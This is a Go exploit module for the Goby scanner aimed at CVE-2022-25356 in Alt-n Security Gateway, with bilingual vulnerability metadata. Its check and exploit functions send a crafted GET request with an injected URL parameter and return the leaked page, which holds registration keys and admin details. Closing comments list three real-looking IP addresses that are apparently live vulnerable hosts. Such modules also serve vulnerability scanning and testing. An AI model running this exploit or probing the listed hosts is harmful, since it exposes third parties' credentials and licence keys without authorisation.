package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Alt-n Security Gateway Information Disclosure(CVE-2022-25356)",
    "Description": "<p>Alt-n develops and manufactures products and solutions for companies to help them be more safe against phishing attacks, malwares and much more, Security Gateway accomplishes that goal giving protection from external/internal email threats.</p><p></p><p>In Alt-n Security Gateway product, a malicious actor could inject an arbitrary XML argument by adding a new parameter in the HTTP request URL. In this way the XML parser fails the validation process disclosing information such as kind of protection used (2FA), admin email and product registration keys.</p>",
    "Product": "Alt-n Security Gateway",
    "Homepage": "https://www.altn.com",
    "DisclosureDate": "2022-02-17",
    "Author": "AnMing",
    "FofaQuery": "server=\"ALT-N SecurityGateway\"",
    "GobyQuery": "server=\"ALT-N SecurityGateway\"",
    "Level": "2",
    "Impact": "<p>An attacker can use the information retrieved to try to authenticate as admin user through brute force attacks, password guessing or using compromised credentials, (since the admin email address used is known).  The product registration keys can be compromised as well.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/\">https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.swascan.com/security-advisory-alt-n-security-gateway/"
    ],
    "Translation": {
        "CN": {
            "Name": "Alt-n Security Gateway 信息泄露漏洞（CVE-2022-25356）",
            "Product": "Alt-n Security Gateway",
            "Description": "<p>Alt-n 为公司开发和制造产品和解决方案，以帮助他们更安全地抵御网络钓鱼攻击、恶意软件等等，Security Gateway 实现了这一目标，提供保护免受外部/内部电子邮件威胁。</p><p></p><p>在 Alt-n 安全网关产品中，恶意行为者可以通过在 HTTP 请求 URL 中添加新参数来注入任意 XML 参数。 通过这种方式，XML 解析器无法通过验证过程，从而泄露所使用的保护类型 (2FA)、管理员电子邮件和产品注册密钥等信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新:<a href=\"https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/\">https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以使用检索到的信息尝试通过暴力攻击、密码猜测或使用泄露的凭据来验证管理员用户身份（因为使用的管理员电子邮件地址是已知的）。 产品注册密钥也可能被泄露。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Alt-n Security Gateway Information Disclosure(CVE-2022-25356)",
            "Product": "Alt-n Security Gateway",
            "Description": "<p>Alt-n develops and manufactures products and solutions for companies to help them be more safe against phishing attacks, malwares and much more, Security Gateway accomplishes that goal giving protection from external/internal email threats.</p><p></p><p>In Alt-n Security Gateway product, a malicious actor could inject an arbitrary XML argument by adding a new parameter in the HTTP request URL. In this way the XML parser fails the validation process disclosing information such as kind of protection used (2FA), admin email and product registration keys.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/\">https://www.altn.com/Support/SecurityUpdate/SG220308_SecurityGateway/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>An attacker can use the information retrieved to try to authenticate as admin user through brute force attacks, password guessing or using compromised credentials, (since the admin email address used is known).  The product registration keys can be compromised as well.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        ""
    ],
    "ExploitSteps": [
        ""
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2022-25356"
    ],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Key=") && strings.Contains(resp.Utf8Html, "AllowLostPasswordLink") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Key=") && strings.Contains(resp.Utf8Html, "AllowLostPasswordLink") {
					expResult.Success = true
					result := strings.ReplaceAll(resp.Utf8Html, "&lt;", "<")
					expResult.Output = strings.ReplaceAll(result, "&gt;", ">")
          //expResult.Output =resp.Utf8Html

				} else {
					expResult.Output = "Error! plase check your input!"
				}
			}
			return expResult
		},
	))
}

//http://5.9.249.238:443
//http://216.221.67.15:4443
//https://212.36.78.4